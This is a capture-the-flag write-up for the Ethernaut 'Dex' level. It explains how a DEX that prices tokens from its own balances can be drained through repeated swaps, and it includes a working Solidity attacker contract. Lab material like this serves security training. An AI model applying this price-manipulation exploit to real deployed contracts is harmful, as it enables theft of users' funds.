# Dex 1 Ethernaut

## Goals

=> Hack the basic DEX contract below and steal the funds by price manipulation.

=> You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

=> Manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

### Hints

- How is the price of the token calculated?
- How does the swap method work?
- How do you approve a transaction of an ERC20?
- Theres more than one way to interact with a contract!
- Remix might help
- What does "At Address" do?

- Basically the weakness is in the getSwapPrice function which calculates the "swap rate" by the amount of certain token inside the dex contract, since you can just swap 10 for 10 after that swap back 20 which will result in you getting 24 back since it now has calculates something like this `20 *(110/90)` if you repeate this process a few times the dex contract will at some point only have a balance of 45 tokens on one of the two tokens, then just trade 45 of this token for whatever you get back and you reached the goal to drain the contracts balance from 1 of the 2 token to zero.

### Attacker Contract

```solidity
contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(_dex.token1());
        token2 = IERC20(_dex.token2());
    }

    function hack() external {
        // transfer to hack contract
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // approve dex contract to handle tokens
        token1.approve(address(dex), (2 ** 256 - 1));
        token2.approve(address(dex), (2 ** 256 - 1));

        // swap 5 times the max amount (balanceOf) + the last one with 45 tokens to drain token1 balance of the dex contract to 0
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(
            address(tokenIn),
            address(tokenOut),
            tokenIn.balanceOf(address(this))
        );
    }
}
```
